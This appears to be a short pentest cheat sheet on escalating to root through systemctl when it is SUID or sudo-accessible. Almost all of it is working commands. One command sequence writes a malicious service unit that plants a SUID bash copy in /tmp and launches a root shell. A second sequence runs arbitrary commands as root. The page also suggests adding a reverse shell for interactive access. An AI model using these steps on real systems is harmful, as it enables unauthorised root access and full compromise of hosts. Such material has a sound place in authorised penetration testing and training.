# sudo systemctl / SUID Service File RCE

When `systemctl` is SUID, sudo-accessible, or you can write a `.service` file that root will load, create a custom unit to execute as root.

**SUID or sudo systemctl:**
```bash
# Create service file in a writable location
cat > /tmp/evil.service << 'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
[Install]
WantedBy=multi-user.target
EOF

systemctl link /tmp/evil.service
systemctl enable --now evil
/tmp/rootbash -p   # SUID bash → root
```

**If output-only shell is needed (GTFOBins style):**
```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/out"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF && systemctl start $(basename $TF)
cat /tmp/out
```

Combine with a reverse shell in `ExecStart` for interactive access.
